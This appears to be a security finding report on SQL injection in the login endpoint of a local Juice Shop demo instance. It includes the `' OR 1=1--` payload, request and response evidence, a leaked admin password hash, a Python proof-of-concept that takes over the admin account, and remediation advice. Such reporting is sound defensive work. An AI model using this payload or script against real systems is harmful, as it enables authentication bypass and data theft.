# SQL Injection in POST /rest/user/login email parameter allows unauthenticated administrator login

**ID:** vuln-0015
**Severity:** CRITICAL
**Found:** 2026-09-11 20:00:57 UTC
**Target:** http://host.docker.internal:3001
**Method:** POST
**CVSS:** 9.1
**Confidence:** High
**Fix Effort:** Low

## Description

The **`email`** parameter of the login endpoint is interpolated directly into a raw SQL query. Supplying `' OR 1=1--` (any password) returns a valid session for the first matching row — the administrator account — including its full JWT and password hash.

## Evidence

Differential evidence — same request with only the email value changed:

```http
POST /rest/user/login  {"email":"probe@test.com","password":"'"}
-> 500 Error: SQLITE_ERROR (raw SQL syntax error proves interpolation)

POST /rest/user/login  {"email":"probe@test.com","password":"' OR 1=1--"}
-> 401 Invalid email or password. (password field inert)

POST /rest/user/login  {"email":"' OR 1=1--","password":"x"}
-> 200 {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."}}
```

Decoded token payload (first row of the OR-1=1 result set):

```json
{"data":{"id":1,"email":"admin@juice-sh.op","role":"admin",
"password":"0192023a7bbd73250516f069df18b500","totpSecret":"..."},"bid":1}
```

Admin access verified with the token: `GET /api/Users` returned 200 with the full user list (401 for unauthenticated requests).

## Impact

Complete authentication bypass without any credentials: the attacker is logged in as the administrator (user id 1) and receives a valid admin JWT. The JWT payload itself also discloses the admin's password hash and TOTP secret. Using the token, the admin-only API was accessed successfully (GET /api/Users returned the full user list). In a production analogue this grants full application administration and database write access.

## Counterevidence

Password field is not injectable — 8 payload variants in the password (with a fixed bogus email) all returned uniform 401 "Invalid email or password", so the weakness is confined to the email parameter. The injected login is not a valid-credential login: password "x" is rejected for every probe/test email tested outside the injection. No WAF, input validation, or parameterization observed on the email field; the single-quote baseline returning a 500 SQLITE error confirms raw string interpolation into the query.

## What Would Change This Severity

If the JWT issued after bypass were restricted to a low-privilege account (no admin row first), the impact would drop to medium; confirmation of writable SQL primitives (e.g. stacked queries) would raise availability impact.

## Technical Analysis

The login handler builds its SQL query via string concatenation of the user-supplied email, on a SQLite backend reached through Sequelize. A single quote in the email produces a 500 `SQLITE_ERROR: incomplete input` page (raw parser error), proving the value is interpolated into the query text. The payload `' OR 1=1--` closes the email literal, makes the WHERE clause a tautology, and comments out the password condition, so the query returns the first row of the Users table — the seeded administrator (`admin@juice-sh.op`, role `admin`). The response then issues the normal JWT for that account; because the JWT payload embeds the full user record, the response also discloses the admin password hash and TOTP secret. The password field itself is not injectable (uniform 401 for all payloads with a fixed bogus email), isolating the flaw to the email parameter.

## Proof of Concept

1. Send a POST request to `/rest/user/login` with JSON body where the `email` field is `' OR 1=1--` and `password` is any string (e.g. `x`).
2. Observe HTTP 200 with an `authentication.token` JWT for `admin@juice-sh.op` (role `admin`, user id 1).
3. Decode the token (no signature verification needed) to confirm the embedded role and password hash.
4. Use the token as `Authorization: Bearer` on the admin-only endpoint `GET /api/Users` and observe the full user list returned, confirming admin-level access.

```python
#!/usr/bin/env python3
"""PoC: Authentication bypass via SQL injection in POST /rest/user/login (email field)."""
import requests

BASE = "http://host.docker.internal:3001"

# 1. Auth bypass: log in as the first row of Users (the admin) with a tautology
r = requests.post(
    BASE + "/rest/user/login",
    json={"email": "' OR 1=1--", "password": "x"},
    timeout=10,
)
assert r.status_code == 200, r.status_code
token = r.json()["authentication"]["token"]
print("[+] Login bypass succeeded, admin JWT obtained")

# 2. Decode payload to show the account taken over
import base64, json
payload = token.split(".")[1]
payload += "=" * (-len(payload) % 4)
data = json.loads(base64.urlsafe_b64decode(payload))["data"]
print(f"[+] Logged in as id={data['id']} email={data['email']} role={data['role']}")
print(f"[+] Password hash leaked in token: {data['password']}")

# 3. Prove admin-level access with the token
r = requests.get(BASE + "/api/Users", headers={"Authorization": f"Bearer {token}"}, timeout=10)
assert r.status_code == 200
users = r.json()["data"]
print(f"[+] Admin-only GET /api/Users returned {len(users)} user records")
```

## Remediation

Replace the raw SQL string interpolation in the login query with Sequelize's parameterized query API (e.g. `sequelize.query` with bind parameters or `Model.findAll` with a where object), so the email value is bound as data rather than concatenated into SQL text. Reject or escape quote characters in the email field as defense in depth, and ensure the login query selects by exact email match rather than a concatenated fragment.

## Assumptions

No privileges or prior knowledge required; endpoint is unauthenticated. Demo instance with seeded data — impact is scored on the demonstrated class (auth bypass + credential disclosure).
